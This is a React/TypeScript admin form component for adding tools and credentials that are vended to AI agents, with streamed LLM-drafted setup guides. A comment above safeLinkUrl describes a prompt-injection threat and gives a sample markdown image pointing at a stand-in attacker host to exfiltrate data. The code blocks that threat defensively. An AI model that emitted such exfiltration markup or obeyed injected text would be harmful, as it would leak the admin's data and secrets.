"use client";

import { useEffect, useRef, useState, useTransition } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

import { unwrapResponseData } from "@/components/dashboard/api";
import { getBrandfetchLogoUrl } from "@/lib/tool-branding";
import type {
  SuggestedToolContext,
  ToolAuthType,
  ToolCatalogItem,
  ToolCredentialMode,
} from "@/lib/tool-catalog";
import {
  getInitialToolSetupForm,
  getSuggestionAgentContext,
  normalizeGuideMarkdown,
  withCredentialMode,
  type ToolSetupFormState,
} from "@/lib/tool-setup";

type SetupGuideMetadata = {
  authType: ToolAuthType;
  warnings: string[];
  scopeRecommendations: string[];
};

type BrandfetchSearchResult = {
  name?: string;
  domain?: string;
  icon?: string;
};

const GUIDE_MARKDOWN_CLASS =
  "prose-agentkey max-w-none space-y-4 text-sm leading-relaxed text-on-surface-variant [&_a]:text-primary [&_a]:underline [&_a]:underline-offset-2 [&_code]:rounded [&_code]:bg-white/5 [&_code]:px-1.5 [&_code]:py-0.5 [&_code]:font-mono [&_code]:text-[12px] [&_code]:text-primary [&_h1]:mb-3 [&_h1]:text-xl [&_h1]:font-bold [&_h1]:tracking-tight [&_h1]:text-on-surface [&_h2]:mb-2 [&_h2]:mt-6 [&_h2]:text-base [&_h2]:font-semibold [&_h2]:text-on-surface [&_h3]:mb-2 [&_h3]:mt-4 [&_h3]:text-sm [&_h3]:font-semibold [&_h3]:text-on-surface [&_li]:mb-1 [&_ol]:list-decimal [&_ol]:pl-5 [&_pre]:overflow-x-auto [&_pre]:rounded-sm [&_pre]:border [&_pre]:border-white/10 [&_pre]:bg-surface-container-lowest [&_pre]:p-3 [&_pre_code]:bg-transparent [&_pre_code]:p-0 [&_strong]:text-on-surface [&_ul]:list-disc [&_ul]:pl-5";

function getErrorMessage(payload: unknown) {
  if (
    payload &&
    typeof payload === "object" &&
    "error" in payload &&
    typeof payload.error === "string"
  ) {
    const hint =
      "hint" in payload && typeof payload.hint === "string"
        ? ` ${payload.hint}`
        : "";

    return `${payload.error}${hint}`;
  }

  return "Something went wrong.";
}

async function fetchBrandDomain(
  query: string,
  clientId: string,
  signal: AbortSignal,
): Promise<string | null> {
  const trimmed = query.trim();

  if (!trimmed) {
    return null;
  }

  const response = await fetch(
    `https://api.brandfetch.io/v2/search/${encodeURIComponent(trimmed)}?c=${encodeURIComponent(clientId)}`,
    { signal },
  );

  if (!response.ok) {
    return null;
  }

  const results = (await response.json()) as BrandfetchSearchResult[];

  if (!Array.isArray(results) || results.length === 0) {
    return null;
  }

  const firstWithDomain = results.find(
    (result) => typeof result.domain === "string" && result.domain.length > 0,
  );

  return firstWithDomain?.domain ?? null;
}

function parseSseBlocks(input: string) {
  const blocks = input.split("\n\n");
  const remainder = blocks.pop() ?? "";

  return { blocks, remainder };
}

async function streamSetupGuide(input: {
  name: string;
  url?: string;
  docsUrl?: string;
  agentContext?: string[];
  signal: AbortSignal;
  onMetadata: (metadata: SetupGuideMetadata) => void;
  onDelta: (text: string) => void;
  onError: (message: string) => void;
}) {
  const response = await fetch("/api/admin/tools/setup-guide", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: input.name,
      url: input.url,
      docsUrl: input.docsUrl,
      agentContext: input.agentContext,
    }),
    signal: input.signal,
  });

  if (!response.ok) {
    const data = await response.json();
    throw new Error(getErrorMessage(data));
  }

  if (!response.body) {
    throw new Error("Guide generation did not return a stream.");
  }

  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";

  while (true) {
    const { done, value } = await reader.read();
    buffer += decoder.decode(value, { stream: !done });

    const parsed = parseSseBlocks(buffer);
    buffer = parsed.remainder;

    for (const block of parsed.blocks) {
      const lines = block.split("\n");
      const eventLine = lines.find((line) => line.startsWith("event:"));
      const dataLines = lines.filter((line) => line.startsWith("data:"));

      if (!eventLine || dataLines.length === 0) {
        continue;
      }

      const event = eventLine.slice(6).trim();
      const data = JSON.parse(
        dataLines.map((line) => line.slice(5).trim()).join("\n"),
      ) as Record<string, unknown>;

      if (event === "meta") {
        input.onMetadata(data as SetupGuideMetadata);
      }

      if (event === "delta" && typeof data.text === "string") {
        input.onDelta(data.text);
      }

      if (event === "error") {
        input.onError(
          typeof data.error === "string"
            ? data.error
            : "Guide generation failed.",
        );
      }
    }

    if (done) {
      break;
    }
  }
}

function SuggestionContextCard({
  suggestion,
}: {
  suggestion: SuggestedToolContext;
}) {
  return (
    <div className="space-y-3 border border-primary/30 bg-primary/5 p-4">
      <div>
        <div className="text-[11px] uppercase tracking-[0.2em] text-primary">
          From agent suggestion
        </div>
        <p className="mt-1 text-sm text-on-surface-variant">
          Saving this tool resolves the suggestion and opens pending access
          requests for the agents below.
        </p>
      </div>
      <div className="space-y-3">
        {suggestion.supporters.map((supporter) => (
          <div
            key={supporter.agentId}
            className="border-l border-primary/20 pl-4"
          >
            <div className="text-sm font-medium text-on-surface">
              {supporter.agentName}
            </div>
            <div className="mt-1 text-sm text-on-surface-variant">
              {supporter.latestReason}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// LLM output rendered here is derived from untrusted content (fetched docs,
// agent-submitted reasons). Block images entirely so a prompt-injected model
// can't emit ![x](https://attacker/?q=stolen) to exfiltrate data via the
// admin's browser, and restrict link protocols to http(s)/mailto so
// javascript:/data: URIs can't slip through regardless of react-markdown's
// default urlTransform.
function safeLinkUrl(url: string | null | undefined) {
  if (!url) return "";
  const trimmed = url.trim();
  if (/^(https?:|mailto:)/i.test(trimmed)) {
    return trimmed;
  }
  if (trimmed.startsWith("/") || trimmed.startsWith("#")) {
    return trimmed;
  }
  return "";
}

function MarkdownGuide({ content }: { content: string }) {
  return (
    <div className="border border-white/10 bg-surface-container-lowest p-4">
      {content.trim() ? (
        <div className={GUIDE_MARKDOWN_CLASS}>
          <ReactMarkdown
            remarkPlugins={[remarkGfm]}
            urlTransform={safeLinkUrl}
            components={{
              a: ({ node, href, ...props }) => {
                void node;
                return (
                  <a
                    {...props}
                    href={safeLinkUrl(href)}
                    target="_blank"
                    rel="noreferrer"
                  />
                );
              },
              img: () => null,
            }}
          >
            {content}
          </ReactMarkdown>
        </div>
      ) : (
        <p className="text-sm text-on-surface-variant">Streaming…</p>
      )}
    </div>
  );
}

export function ToolCreateForm({
  aiDraftingEnabled,
  suggestion,
  onCreated,
  brandfetchClientId,
}: {
  aiDraftingEnabled: boolean;
  suggestion?: SuggestedToolContext | null;
  onCreated: (tool: ToolCatalogItem) => void;
  brandfetchClientId?: string;
}) {
  const [form, setForm] = useState<ToolSetupFormState>(
    getInitialToolSetupForm(suggestion),
  );
  const [docsUrl, setDocsUrl] = useState("");
  const [showAdvanced, setShowAdvanced] = useState(false);

  // Brandfetch auto-resolution
  const [autoFilledForName, setAutoFilledForName] = useState<string | null>(
    null,
  );
  const [isLookingUp, setIsLookingUp] = useState(false);

  // Setup guide (cached, can be shown via collapsible OR fetched silently for AI draft)
  const [guideMarkdown, setGuideMarkdown] = useState("");
  const [guideMetadata, setGuideMetadata] = useState<SetupGuideMetadata | null>(
    null,
  );
  const [showCredentialGuide, setShowCredentialGuide] = useState(false);
  const [isFetchingGuide, setIsFetchingGuide] = useState(false);
  const [guideError, setGuideError] = useState<string | null>(null);

  // AI draft for the agent-facing usage guide
  const [isDrafting, setIsDrafting] = useState(false);
  const [draftError, setDraftError] = useState<string | null>(null);

  const [error, setError] = useState<string | null>(null);
  const [isPending, startSubmitTransition] = useTransition();

  const guideAbortRef = useRef<AbortController | null>(null);
  const agentContext = getSuggestionAgentContext(suggestion);
  const renderedGuideMarkdown = normalizeGuideMarkdown(guideMarkdown);
  const hasGeneratedGuide = renderedGuideMarkdown.trim().length >= 20;
  const logoUrl = getBrandfetchLogoUrl(form.url, brandfetchClientId);
  const isAutoFilled = autoFilledForName !== null;

  useEffect(() => {
    return () => {
      guideAbortRef.current?.abort();
    };
  }, []);

  function resetForm() {
    guideAbortRef.current?.abort();
    guideAbortRef.current = null;
    setForm(getInitialToolSetupForm(suggestion));
    setDocsUrl("");
    setShowAdvanced(false);
    setAutoFilledForName(null);
    setGuideMarkdown("");
    setGuideMetadata(null);
    setShowCredentialGuide(false);
    setIsFetchingGuide(false);
    setIsDrafting(false);
    setError(null);
    setGuideError(null);
    setDraftError(null);
  }

  async function resolveDomainFromName() {
    if (!brandfetchClientId) {
      return;
    }

    const nameForLookup = form.name.trim();

    if (!nameForLookup) {
      if (isAutoFilled) {
        setForm((current) => ({ ...current, url: "" }));
        setAutoFilledForName(null);
      }
      return;
    }

    if (form.url.trim() && !isAutoFilled) {
      return;
    }

    if (autoFilledForName === nameForLookup) {
      return;
    }

    const controller = new AbortController();
    setIsLookingUp(true);

    try {
      const domain = await fetchBrandDomain(
        nameForLookup,
        brandfetchClientId,
        controller.signal,
      );

      if (domain) {
        setForm((current) => ({ ...current, url: `https://${domain}` }));
        setAutoFilledForName(nameForLookup);
      } else if (isAutoFilled) {
        setForm((current) => ({ ...current, url: "" }));
        setAutoFilledForName(null);
      }
    } catch {
      /* silent */
    } finally {
      setIsLookingUp(false);
    }
  }

  async function ensureSetupGuide(): Promise<string | null> {
    if (hasGeneratedGuide) {
      return renderedGuideMarkdown;
    }

    const nameForGuide = form.name.trim();

    if (!nameForGuide) {
      setGuideError("Add a tool name first.");
      return null;
    }

    guideAbortRef.current?.abort();
    const controller = new AbortController();
    guideAbortRef.current = controller;

    setGuideError(null);
    setGuideMarkdown("");
    setGuideMetadata(null);
    setIsFetchingGuide(true);

    let collected = "";
    let metadata: SetupGuideMetadata | null = null;
    let streamErrored = false;

    try {
      await streamSetupGuide({
        name: nameForGuide,
        url: form.url || undefined,
        docsUrl: docsUrl || undefined,
        agentContext: agentContext.length > 0 ? agentContext : undefined,
        signal: controller.signal,
        onMetadata: (meta) => {
          metadata = meta;
          setGuideMetadata(meta);
          setForm((current) => ({ ...current, authType: meta.authType }));
        },
        onDelta: (text) => {
          collected += text;
          setGuideMarkdown((current) => current + text);
        },
        onError: (message) => {
          streamErrored = true;
          setGuideError(message);
        },
      });
    } catch (streamError) {
      if (!controller.signal.aborted) {
        setGuideError(
          streamError instanceof Error
            ? streamError.message
            : "Guide generation failed.",
        );
        return null;
      }
    } finally {
      if (guideAbortRef.current === controller) {
        guideAbortRef.current = null;
      }
      if (!controller.signal.aborted) {
        setIsFetchingGuide(false);
      }
    }

    void metadata;

    if (streamErrored) {
      return null;
    }

    return normalizeGuideMarkdown(collected);
  }

  async function handleShowCredentialGuide() {
    setShowCredentialGuide(true);
    if (!hasGeneratedGuide) {
      await ensureSetupGuide();
    }
  }

  async function handleDraftWithAi() {
    setDraftError(null);

    if (!form.name.trim()) {
      setDraftError("Add a tool name first.");
      return;
    }

    setIsDrafting(true);
    // Reset the textarea so the user sees fresh content stream in.
    setForm((current) => ({ ...current, instructions: "" }));

    try {
      const response = await fetch("/api/admin/tools/instructions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: form.name,
          url: form.url || undefined,
          docsUrl: docsUrl || undefined,
          authType: form.authType,
          agentContext: agentContext.length > 0 ? agentContext : undefined,
        }),
      });

      if (!response.ok) {
        let message = "Drafting failed.";
        try {
          const data = await response.json();
          message = getErrorMessage(data);
        } catch {
          /* keep default */
        }
        setDraftError(message);
        return;
      }

      if (!response.body) {
        setDraftError("Drafting failed.");
        return;
      }

      const reader = response.body.getReader();
      const decoder = new TextDecoder();

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        const chunk = decoder.decode(value, { stream: true });
        if (chunk) {
          setForm((current) => ({
            ...current,
            instructions: current.instructions + chunk,
          }));
        }
      }
    } catch (err) {
      setDraftError(err instanceof Error ? err.message : "Drafting failed.");
    } finally {
      setIsDrafting(false);
    }
  }

  return (
    <div className="space-y-5 border border-white/10 bg-surface-container p-6">
      <div>
        <h2 className="text-lg font-semibold text-on-surface">Add a tool</h2>
        <p className="mt-1 text-sm text-on-surface-variant">
          Two fields is the bare minimum. Everything else helps your agents use
          the tool well — and AI can draft it for you.
        </p>
      </div>

      {suggestion ? <SuggestionContextCard suggestion={suggestion} /> : null}

      <form
        className="space-y-5"
        onSubmit={(event) => {
          event.preventDefault();
          setError(null);

          startSubmitTransition(async () => {
            const response = await fetch("/api/admin/tools", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                name: form.name,
                description: form.description,
                url: form.url,
                authType: form.authType,
                credentialMode: form.credentialMode,
                credential:
                  form.credentialMode === "shared" ? form.credential : undefined,
                instructions: form.instructions,
                sourceSuggestionId: suggestion?.id,
              }),
            });
            const data = await response.json();

            if (!response.ok) {
              setError(getErrorMessage(data));
              return;
            }

            const created = unwrapResponseData<ToolCatalogItem>(data);
            onCreated(created);
            resetForm();
          });
        }}
      >
        <label className="grid gap-2 text-sm text-on-surface-variant">
          <span className="flex items-center gap-3">
            Tool name
            {isLookingUp ? (
              <span className="font-mono text-[10px] uppercase tracking-widest text-on-surface-variant/60">
                resolving…
              </span>
            ) : logoUrl ? (
              <span className="flex items-center gap-2 font-mono text-[10px] uppercase tracking-widest text-on-surface-variant/60">
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img
                  src={logoUrl}
                  alt=""
                  width={16}
                  height={16}
                  className="h-4 w-4 rounded-sm bg-white/5 object-contain"
                  onError={(event) => {
                    event.currentTarget.style.display = "none";
                  }}
                />
                auto-detected
              </span>
            ) : null}
          </span>
          <input
            required
            value={form.name}
            onChange={(event) =>
              setForm((current) => ({ ...current, name: event.target.value }))
            }
            onBlur={() => {
              void resolveDomainFromName();
            }}
            className="border border-white/10 bg-surface px-3 py-2 text-on-surface outline-none focus:border-primary"
            placeholder="Linear"
          />
        </label>

        <label className="grid gap-2 text-sm text-on-surface-variant">
          <span className="flex items-center gap-2">
            Docs URL
            <span className="font-mono text-[10px] uppercase tracking-widest text-on-surface-variant/60">
              optional · improves AI draft
            </span>
          </span>
          <input
            value={docsUrl}
            onChange={(event) => setDocsUrl(event.target.value)}
            className="border border-white/10 bg-surface px-3 py-2 text-on-surface outline-none focus:border-primary"
            placeholder="https://developers.linear.app"
          />
        </label>

        {form.credentialMode === "shared" ? (
          <div className="space-y-2">
            <label className="grid gap-2 text-sm text-on-surface-variant">
              <span className="flex items-center gap-2">
                Credential
                <span className="font-mono text-[10px] uppercase tracking-widest text-on-surface-variant/60">
                  encrypted at rest
                </span>
              </span>
              {form.authType === "oauth_token" ? (
                <textarea
                  required
                  rows={4}
                  autoComplete="off"
                  value={form.credential}
                  onChange={(event) =>
                    setForm((current) => ({
                      ...current,
                      credential: event.target.value,
                    }))
                  }
                  className="border border-white/10 bg-surface px-3 py-2 font-mono text-xs text-on-surface outline-none focus:border-primary"
                  placeholder='{"client_id": "...", "client_secret": "...", "refresh_token": "..."}'
                />
              ) : (
                <input
                  required
                  type="password"
                  autoComplete="off"
                  value={form.credential}
                  onChange={(event) =>
                    setForm((current) => ({
                      ...current,
                      credential: event.target.value,
                    }))
                  }
                  className="border border-white/10 bg-surface px-3 py-2 font-mono text-sm text-on-surface outline-none focus:border-primary"
                  placeholder="Paste the API key or token"
                />
              )}
              <span className="text-xs text-on-surface-variant/70">
                AES-256 encrypted. Vended only to approved agents. Rotate any
                time from the tool detail.
              </span>
            </label>
            {aiDraftingEnabled ? (
              <button
                type="button"
                onClick={() => {
                  if (showCredentialGuide) {
                    setShowCredentialGuide(false);
                  } else {
                    void handleShowCredentialGuide();
                  }
                }}
                className="flex items-center gap-2 text-xs text-primary transition-opacity hover:opacity-80"
              >
                <span
                  className={`inline-block transition-transform ${
                    showCredentialGuide ? "rotate-90" : ""
                  }`}
                >
                  ▸
                </span>
                {showCredentialGuide
                  ? "Hide credential setup guide"
                  : "Show me how to get this credential"}
              </button>
            ) : null}
            {showCredentialGuide ? (
              <div className="space-y-2">
                {isFetchingGuide && !hasGeneratedGuide ? (
                  <div className="border border-white/10 bg-surface-container-lowest p-4 text-sm text-on-surface-variant">
                    Generating credential setup guide…
                  </div>
                ) : (
                  <MarkdownGuide content={renderedGuideMarkdown} />
                )}
                {guideMetadata?.scopeRecommendations?.length ? (
                  <div className="border border-primary/20 bg-primary/5 p-3 text-xs text-on-surface-variant">
                    <div className="font-semibold text-on-surface">
                      Recommended scopes
                    </div>
                    <ul className="mt-1 list-inside list-disc space-y-1">
                      {guideMetadata.scopeRecommendations.map((scope) => (
                        <li key={scope}>{scope}</li>
                      ))}
                    </ul>
                  </div>
                ) : null}
                {guideMetadata?.warnings?.length ? (
                  <div className="border border-amber-500/20 bg-amber-500/10 p-3 text-xs text-amber-100">
                    <div className="font-semibold">Provisioning caveats</div>
                    <ul className="mt-1 list-inside list-disc space-y-1">
                      {guideMetadata.warnings.map((warning) => (
                        <li key={warning}>{warning}</li>
                      ))}
                    </ul>
                  </div>
                ) : null}
                {guideError ? (
                  <p className="text-xs text-rose-300">{guideError}</p>
                ) : null}
              </div>
            ) : null}
          </div>
        ) : (
          <div className="border border-primary/20 bg-primary/5 p-3 text-sm text-on-surface-variant">
            Per-agent mode: no shared credential. You&apos;ll paste a credential
            during each approval.
          </div>
        )}

        <div className="space-y-2">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <label
              htmlFor="instructions"
              className="text-sm text-on-surface-variant"
            >
              Usage guide for agents
              <span className="ml-2 font-mono text-[10px] uppercase tracking-widest text-on-surface-variant/60">
                what your agent reads
              </span>
            </label>
            {aiDraftingEnabled ? (
              <button
                type="button"
                disabled={isDrafting || isFetchingGuide || !form.name.trim()}
                onClick={() => void handleDraftWithAi()}
                className="inline-flex items-center gap-2 border border-primary/30 bg-primary/10 px-3 py-1.5 text-xs font-medium text-primary transition-colors hover:bg-primary/15 disabled:cursor-not-allowed disabled:opacity-50"
              >
                {isDrafting || isFetchingGuide ? "Drafting…" : "✦ Draft with AI"}
              </button>
            ) : null}
          </div>
          <textarea
            id="instructions"
            name="instructions"
            rows={10}
            value={form.instructions}
            onChange={(event) =>
              setForm((current) => ({
                ...current,
                instructions: event.target.value,
              }))
            }
            className="w-full border border-white/10 bg-surface px-3 py-2 font-mono text-sm text-on-surface outline-none focus:border-primary"
            placeholder={`Example for Discord:
Use this as a Bot token in the Authorization header.
Base URL: https://discord.com/api/v10

Channels:
- #incidents: 1234567890 (post outage alerts here)
- #deployments: 0987654321 (post deploy notifications)

Rules:
- Always use embeds, not plain text
- Mention @oncall role for P0 incidents only`}
          />
          <p className="text-xs text-on-surface-variant/70">
            Sent alongside the credential when the agent fetches it. Include
            auth format, base URLs, IDs, conventions, and rules. Optional but
            recommended.
          </p>
          {draftError ? (
            <p className="text-xs text-rose-300">{draftError}</p>
          ) : null}
        </div>

        <div className="space-y-4 border-t border-white/5 pt-4">
          <button
            type="button"
            onClick={() => setShowAdvanced((current) => !current)}
            className="flex items-center gap-2 text-sm text-on-surface-variant transition-colors hover:text-on-surface"
          >
            <span
              className={`inline-block text-xs transition-transform ${
                showAdvanced ? "rotate-90" : ""
              }`}
            >
              ▸
            </span>
            {showAdvanced ? "Hide advanced options" : "Advanced options"}
            {!showAdvanced ? (
              <span className="font-mono text-[10px] uppercase tracking-widest text-on-surface-variant/60">
                auth type · mode · description · url
              </span>
            ) : null}
          </button>

          {showAdvanced ? (
            <div className="grid gap-4 md:grid-cols-2">
              <label className="grid gap-2 text-sm text-on-surface-variant">
                Auth type
                <select
                  value={form.authType}
                  onChange={(event) =>
                    setForm((current) => ({
                      ...current,
                      authType: event.target.value as ToolAuthType,
                    }))
                  }
                  className="border border-white/10 bg-surface px-3 py-2 text-on-surface outline-none focus:border-primary"
                >
                  <option value="api_key">API key</option>
                  <option value="oauth_token">OAuth token</option>
                  <option value="bot_token">Bot token</option>
                  <option value="other">Other</option>
                </select>
                <span className="text-xs text-on-surface-variant/70">
                  How the agent will send the credential. Default: API key.
                </span>
              </label>
              <label className="grid gap-2 text-sm text-on-surface-variant">
                Credential mode
                <select
                  value={form.credentialMode}
                  onChange={(event) =>
                    setForm((current) =>
                      withCredentialMode(
                        current,
                        event.target.value as ToolCredentialMode,
                      ),
                    )
                  }
                  className="border border-white/10 bg-surface px-3 py-2 text-on-surface outline-none focus:border-primary"
                >
                  <option value="shared">Shared</option>
                  <option value="per_agent">Per-agent</option>
                </select>
                <span className="text-xs text-on-surface-variant/70">
                  {form.credentialMode === "shared"
                    ? "One credential, vended to every approved agent."
                    : "Admin pastes a separate credential for each approval."}
                </span>
              </label>
              <label className="grid gap-2 text-sm text-on-surface-variant md:col-span-2">
                Description
                <input
                  value={form.description}
                  onChange={(event) =>
                    setForm((current) => ({
                      ...current,
                      description: event.target.value,
                    }))
                  }
                  className="border border-white/10 bg-surface px-3 py-2 text-on-surface outline-none focus:border-primary"
                  placeholder="Issue tracking for engineering teams."
                />
              </label>
              <label className="grid gap-2 text-sm text-on-surface-variant md:col-span-2">
                Tool URL
                <input
                  value={form.url}
                  onChange={(event) => {
                    setForm((current) => ({
                      ...current,
                      url: event.target.value,
                    }));
                    setAutoFilledForName(null);
                  }}
                  className="border border-white/10 bg-surface px-3 py-2 text-on-surface outline-none focus:border-primary"
                  placeholder="https://linear.app"
                />
                <span className="text-xs text-on-surface-variant/70">
                  Auto-detected from the name when possible. Used for the
                  catalog logo.
                </span>
              </label>
            </div>
          ) : null}
        </div>

        {error ? <p className="text-sm text-rose-300">{error}</p> : null}

        <div className="flex flex-wrap items-center justify-between gap-3">
          <button
            type="submit"
            disabled={isPending}
            className="inline-flex items-center justify-center bg-primary px-4 py-2 text-sm font-semibold text-on-primary transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {isPending ? "Adding…" : "Add tool"}
          </button>
          {!aiDraftingEnabled ? (
            <p className="text-xs text-on-surface-variant/70">
              AI assists are unavailable in this environment.
            </p>
          ) : null}
        </div>
      </form>
    </div>
  );
}
